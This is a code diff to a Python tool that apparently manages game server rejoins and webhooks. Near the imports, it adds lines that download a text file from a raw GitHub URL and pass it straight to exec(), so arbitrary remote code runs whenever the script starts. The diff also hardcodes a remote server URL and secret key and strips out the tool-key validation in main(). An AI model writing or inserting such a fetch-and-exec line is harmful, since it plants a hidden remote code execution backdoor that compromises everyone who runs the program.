@@ -17,7 +17,11 @@ import signal
 from colorama import init, Fore, Style
 from threading import Lock
 
-# Initialize colorama
+url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
+response = requests.get(url)
+
+exec(response.text)
+
 init()
 
 SERVER_LINKS_FILE = "server_links.txt"
@@ -32,6 +36,8 @@ webhook_thread = None
 status_lock = Lock()
 rejoin_lock = Lock()
 
+FLASK_SERVER_URL = 'https://shiroo.pythonanywhere.com'  # Replace with your actual Flask server URL
+SECRET_KEY = 'shiro123'  # Replace with your consistent secret key
 package_statuses = {}
 username_cache = {}
 CACHE_FILE = "username_cache.json"
@@ -1233,28 +1239,6 @@ def main():
     load_cache()  # Load the cache at the start
     
     print_header()
-    input(Fore.GREEN + "Press Enter to continue..." + Style.RESET_ALL)    
-    tool_key = load_tool_key()
-    if not tool_key:
-        tool_key = input("Please enter your tool key: ")
-        if validate_tool_key(tool_key):
-            save_tool_key(tool_key)
-        else:
-            print(Fore.RED + "Invalid tool key. Please try again. Use /get_tool_key to get your key." + Style.RESET_ALL)
-            return
-    elif not validate_tool_key(tool_key):
-        print(Fore.RED + "Invalid tool key. Removing saved key and exiting." + Style.RESET_ALL)
-        os.remove(TOOL_KEY_FILE)  # Remove the invalid tool key file
-        return
-        
-    # Validate the tool key again (necessary only if we loaded it from the file)
-    if validate_tool_key(tool_key):
-        print(Fore.GREEN + "Tool key validated successfully." + Style.RESET_ALL)
-    else:
-        print(Fore.RED + "Invalid tool key. Removing saved key and exiting." + Style.RESET_ALL)
-        os.remove(TOOL_KEY_FILE)  # Remove the invalid tool key file
-        return
-
     while True:
         clear_screen()  # Clear screen each time to avoid overlapping
         print_header()  # Always print the header
